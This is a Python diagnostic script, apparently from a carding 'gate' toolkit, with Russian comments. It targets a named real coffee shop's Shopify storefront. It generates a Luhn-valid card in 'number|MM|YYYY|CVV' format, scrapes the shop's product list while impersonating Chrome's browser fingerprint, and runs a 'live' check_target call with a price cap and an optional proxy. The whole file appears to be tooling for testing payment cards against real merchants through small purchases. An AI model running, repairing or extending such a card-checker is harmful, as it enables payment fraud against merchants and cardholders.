import asyncio
import os
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import gate_client as gc
import shopify_gate as sg
from curl_cffi.requests import AsyncSession

async def main():
    target = "https://thebeancoffeecompany.com"
    card = "379363037123456"
    luhn_card = card[:-1] + str(gc.luhn_check_digit(card[:-1]))
    raw_card = f"{luhn_card}|12|2030|1234"
    
    print(f"[*] Диагностика {target} ...", flush=True)
    
    # 1. Проверяем products.json напрямую с разными настройками
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
    }
    
    async with AsyncSession(impersonate="chrome120") as s:
        print("[1] GET /products.json?limit=25 (impersonate=chrome120)...", flush=True)
        try:
            r = await s.get(f"{target}/products.json?limit=25", headers=headers, timeout=10)
            print(f"    HTTP Status: {r.status_code}", flush=True)
            if r.status_code == 200:
                data = r.json()
                prods = data.get("products", [])
                print(f"    Products count: {len(prods)}", flush=True)
                for p in prods[:3]:
                    for v in p.get("variants", []):
                        print(f"      - {p['title']} (variant {v['id']}): ${v.get('price')} (avail: {v.get('available')})", flush=True)
            else:
                print(f"    Body snippet: {r.text[:200]}", flush=True)
        except Exception as e:
            print(f"    Exception: {type(e).__name__}: {e}", flush=True)

    # 2. Боевой вызов check_target
    print("\n[2] Запуск боевого check_target direct (без прокси)...", flush=True)
    t0 = time.time()
    try:
        res = await sg.check_target(target, raw_card, proxy=None, max_price_cents=2000)
        dur = round(time.time() - t0, 2)
        print(f"    Result: {res} ({dur}s)", flush=True)
    except Exception as e:
        dur = round(time.time() - t0, 2)
        print(f"    Check Exception: {type(e).__name__}: {e} ({dur}s)", flush=True)

if __name__ == "__main__":
    asyncio.run(main())
